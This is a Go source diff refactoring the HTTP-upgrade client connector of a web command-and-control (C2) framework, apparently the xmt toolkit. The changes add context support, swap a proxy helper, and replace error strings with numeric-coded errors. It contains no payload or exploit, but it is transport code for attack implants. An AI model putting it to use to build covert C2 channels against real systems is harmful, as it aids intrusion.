@@ -1,6 +1,7 @@
 package wc2
 
 import (
+	"context"
 	"crypto/tls"
 	"io"
 	"net"
@@ -12,8 +13,9 @@ import (
 	"time"
 
 	"github.com/iDigitalFlame/xmt/com"
-	"github.com/iDigitalFlame/xmt/device/devtools"
+	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
+	"github.com/iDigitalFlame/xmt/util/crypt"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
@@ -21,17 +23,19 @@ var (
 	// NOTE(dij): This is fucking annoying.. why? The error is ALWAYS nil!
 	jar, _ = cookiejar.New(nil)
 
-	// Default is the default web c2 client that can be used to create client connections.
+	// Default is the default web c2 client that can be used to create client
+	// connections.
 	Default = &Client{Client: DefaultHTTP}
 
-	// DefaultHTTP is the HTTP Client struct that is used when the provided client is nil.
+	// DefaultHTTP is the HTTP Client struct that is used when the provided
+	// client is nil.
 	DefaultHTTP = &http.Client{Jar: jar, Transport: DefaultTransport}
 
-	// DefaultTransport is the default HTTP transport struct that contains the default settings
-	// and timeout values used in DefaultHTTP. This struct uses any set proxy settings contained
-	// in the execution environment.
+	// DefaultTransport is the default HTTP transport struct that contains the
+	// default settings and timeout values used in DefaultHTTP. This struct uses
+	// any set proxy settings contained in the execution environment.
 	DefaultTransport = &http.Transport{
-		Proxy:                 devtools.Proxy,
+		Proxy:                 device.Proxy,
 		DialContext:           (&net.Dialer{Timeout: com.DefaultTimeout, KeepAlive: com.DefaultTimeout, DualStack: true}).DialContext,
 		MaxIdleConns:          64,
 		IdleConnTimeout:       com.DefaultTimeout,
@@ -54,12 +58,13 @@ var (
 	}
 )
 
-// Client is a simple struct that supports the C2 client connector interface. This can be used by
-// clients to connect to a Web instance.
+// Client is a simple struct that supports the C2 client connector interface.
+// This can be used by clients to connect to a Web instance.
 //
 // By default, this struct will use the DefaultHTTP struct.
 //
-// The initial unspecified Target state will be empty and will use the default (Golang) values.
+// The initial unspecified Target state will be empty and will use the default
+// (Golang) values.
 type Client struct {
 	_      [0]func()
 	Target *Target
@@ -81,8 +86,8 @@ func (c *client) Close() error {
 	return err
 }
 
-// Insecure will set the TLS verification status of the Client to the specified boolean value
-// and return itself.
+// Insecure will set the TLS verification status of the Client to the specified
+// boolean value and return itself.
 func (c *Client) Insecure(i bool) *Client {
 	t, ok := c.Transport.(*http.Transport)
 	if !ok {
@@ -112,21 +117,22 @@ func rawParse(r string) (*url.URL, error) {
 		return nil, err
 	}
 	if len(u.Host) == 0 {
-		return nil, xerr.New(`parse "` + r + `": empty host field`)
+		return nil, xerr.Sub("empty host field", 0x9)
 	}
 	if u.Host[len(u.Host)-1] == ':' {
-		return nil, xerr.New(`parse "` + r + `": invalid port specified`)
+		return nil, xerr.Sub("invalid port specified", 0xD)
 	}
 	if len(u.Scheme) == 0 {
-		u.Scheme = "http"
+		u.Scheme = crypt.HTTP
 	}
 	return u, nil
 }
 
-// NewClient returns a new WC2 client instance with the supplied timeout and Target options.
+// NewClient returns a new WC2 client instance with the supplied timeout and
+// Target options.
 //
-// If the durartion is less than one or equals 'com.DefaultTimeout' than this function will use
-// the cached 'DefaultTransport' variable instead.
+// If the durartion is less than one or equals 'com.DefaultTimeout' than this
+// function will use the cached 'DefaultTransport' variable instead.
 func NewClient(d time.Duration, t *Target) *Client {
 	j, _ := cookiejar.New(nil)
 	if d <= 0 || d == com.DefaultTimeout {
@@ -137,7 +143,7 @@ func NewClient(d time.Duration, t *Target) *Client {
 		Client: &http.Client{
 			Jar: j,
 			Transport: &http.Transport{
-				Proxy:                 devtools.Proxy,
+				Proxy:                 device.Proxy,
 				DialContext:           (&net.Dialer{Timeout: d, KeepAlive: d, DualStack: true}).DialContext,
 				MaxIdleConns:          64,
 				IdleConnTimeout:       d,
@@ -153,20 +159,18 @@ func NewClient(d time.Duration, t *Target) *Client {
 	}
 }
 
-// Connect creates a C2 client connector that uses the same properties of the Client and
-// Generator instance parents.
-func (c *Client) Connect(a string) (net.Conn, error) {
-	return connect(c.Target, c.Client, a)
+// Connect creates a C2 client connector that uses the same properties of the
+// Client and Target instance parents.
+func (c *Client) Connect(x context.Context, a string) (net.Conn, error) {
+	return connect(x, c.Target, c.Client, a)
 }
-func connect(t *Target, c *http.Client, a string) (net.Conn, error) {
-	// NOTE(dij): We don't need to use WithContext here as we assume that the http.Client
-	//            struct has some sort of timeouts set.
+func connect(x context.Context, t *Target, c *http.Client, a string) (net.Conn, error) {
 	// NOTE(dij): URL is empty we will parse it and mutate it with our Target.
 	u, err := rawParse(a)
 	if err != nil {
 		return nil, err
 	}
-	r, _ := http.NewRequest(http.MethodGet, "", nil)
+	r, _ := http.NewRequestWithContext(x, http.MethodGet, "", nil)
 	if r.URL = u; t != nil && !t.empty() {
 		t.mutate(r)
 	}
@@ -175,11 +179,11 @@ func connect(t *Target, c *http.Client, a string) (net.Conn, error) {
 		return nil, err
 	}
 	if d.StatusCode != http.StatusSwitchingProtocols {
-		return nil, xerr.New("received invalid HTTP response")
+		return nil, xerr.Sub("invalid HTTP response", 0xF)
 	}
 	if _, ok := d.Body.(io.ReadWriteCloser); !ok {
 		d.Body.Close()
-		return nil, xerr.New("HTTP body is not writable")
+		return nil, xerr.Sub("body is not writable", 0xC)
 	}
 	// NOTE(dij): I really don't like using reflect, but it's the only
 	//            way to grab the 'net.Conn' inside the private struct that the http
@@ -200,5 +204,5 @@ func connect(t *Target, c *http.Client, a string) (net.Conn, error) {
 		bugtrack.Track("wc2.connect(): Struct type (%T) could not grab net.Conn!", d.Body)
 	}
 	d.Body.Close()
-	return nil, xerr.New("could not get underlying net.Conn")
+	return nil, xerr.Sub("could not get underlying net.Conn", 0x3)
 }
